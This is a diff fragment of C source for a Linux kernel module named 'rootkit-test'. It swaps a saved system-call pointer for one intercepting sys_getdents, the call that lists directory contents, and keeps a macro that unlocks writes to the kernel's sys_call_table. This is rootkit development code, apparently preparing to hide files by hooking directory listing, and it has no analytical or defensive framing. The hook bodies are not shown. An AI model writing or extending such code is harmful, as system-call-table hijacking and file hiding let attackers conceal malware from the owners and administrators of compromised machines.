@@ -11,6 +11,7 @@
 #include <asm/errno.h>
 #include <linux/kallsyms.h>
 #include <linux/syscalls.h>
+#include <linux/dirent.h>
 
 #define DEVICE_NAME "rootkit-test"
 #define TEST_MSG "Inserting Rootkit"
@@ -35,7 +36,7 @@ static int Device_Open = 0;
 static int USE_COUNT = 0;
 
 //Globals for intercepts
-static typeof(sys_read) *orig_openat;
+static typeof(sys_getdents) *orig_getdents;
 
 //Allow writes to sys_call_table
 #define CRO_WRITE_UNLOCK(x) \
